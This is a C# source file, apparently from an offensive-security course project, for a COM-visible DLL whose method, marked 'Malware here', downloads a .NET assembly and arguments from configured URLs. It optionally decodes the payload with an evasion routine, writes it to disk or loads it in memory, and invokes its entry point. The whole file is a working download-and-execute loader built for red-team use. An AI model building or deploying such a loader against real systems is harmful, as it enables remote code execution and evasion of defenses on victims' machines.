using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace OSEP
{
    [ComVisible(true)]
    public class OSEPRunner
    {

        public static void OSEPExec()
        {
            //Malware here.
            Debug.RunDebug("DLL Artifact Execute Assembly Dynamic OSEPExec() has started...");
            RunAssembly().GetAwaiter().GetResult();
        }

        private static async Task<int> RunAssembly()
        {
            byte[] assemblyBytes = { };
            byte[] dBytes = { };

            Debug.RunDebug("Downloading assembly...");
            try
            {
                assemblyBytes = await DownloadBytes(CONFIG.EA_DYNAMIC_URL);
            }
            catch (Exception ex)
            {
                Debug.RunDebug($"Error Downloading bytes: {ex.Message}");
            }


            Debug.RunDebug("Downloading Parameters...");
            string rawargs = await DownloadString(CONFIG.EA_DYNAMIC_ARGUMENTS_URL);

            Debug.RunDebug("Parsing Args...");
            string[] args = rawargs.Split(',');



            Debug.RunDebug("Loading assembly...");
            Assembly asm;


            if (CONFIG.EA_DYNAMIC_WRITE_ASSEMBLY_TO_DISK)
            {
                File.WriteAllBytes(CONFIG.EA_ASSEMBLY_WRITE_LOCATION, assemblyBytes); //encoded assembly on disk
            }



            if (CONFIG.EA_DYNAMIC_WRITE_ASSEMBLY_TO_DISK)
            {
                if (CONFIG.EA_ASSEMBLY_IS_ENCODED)
                {
                    File.WriteAllBytes(CONFIG.EA_ASSEMBLY_WRITE_LOCATION, Evasion.Decode(File.ReadAllBytes(CONFIG.EA_ASSEMBLY_WRITE_LOCATION))); //decode file. doesn't bypass crap fwiw.
                    asm = Assembly.LoadFrom(CONFIG.EA_ASSEMBLY_WRITE_LOCATION);
                }
                else
                    asm = Assembly.LoadFrom(CONFIG.EA_ASSEMBLY_WRITE_LOCATION);

            }
            else
            {
                byte[] deBytes;

                if (CONFIG.EA_ASSEMBLY_IS_ENCODED)
                    deBytes = Evasion.Decode(assemblyBytes);
                else
                    deBytes = assemblyBytes;

                asm = Assembly.Load(deBytes);

            }






            MethodInfo entry = asm.EntryPoint;
            ParameterInfo[] entryParams = entry.GetParameters();

            object[] parameters;

            if (entryParams.Length == 0)
            {
                parameters = new object[0];
            }
            else if (entryParams.Length == 1)
            {
                parameters = new object[] { args };
            }
            else
            {
                throw new InvalidOperationException("Unsupported entry point signature.");
            }



            try
            {
                Debug.RunDebug("Invoking assembly...");
                object result = entry.Invoke(null, parameters);

                Task task = result as Task;
                if (task != null)
                {
                    await task;

                    // Handles Task<int>
                    Type taskType = task.GetType();
                    if (taskType.IsGenericType && taskType.GetGenericTypeDefinition() == typeof(Task<>))
                    {
                        PropertyInfo resultProperty = taskType.GetProperty("Result");
                        object taskResult = resultProperty.GetValue(task, null);

                        if (taskResult is int)
                            return (int)taskResult;
                    }

                    return 0;
                }

                if (result is int)
                    return (int)result;
            }
            catch
            {
                Debug.RunDebug("Error invoking assembly...");
            }




            Debug.RunDebug("Done...\n\n");
            return 0;
        }

        private static async Task<byte[]> DownloadBytes(string url)
        {
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    return await client.GetByteArrayAsync(url);
                }
                catch (Exception ex)
                {
                    Debug.RunDebug($"{ex.Message}");
                }
                return await client.GetByteArrayAsync(url);
                ;
            }
        }

        private static async Task<string> DownloadString(string url)
        {
            using (HttpClient client = new HttpClient())
            {
                return await client.GetStringAsync(url);
            }
        }

    }
}
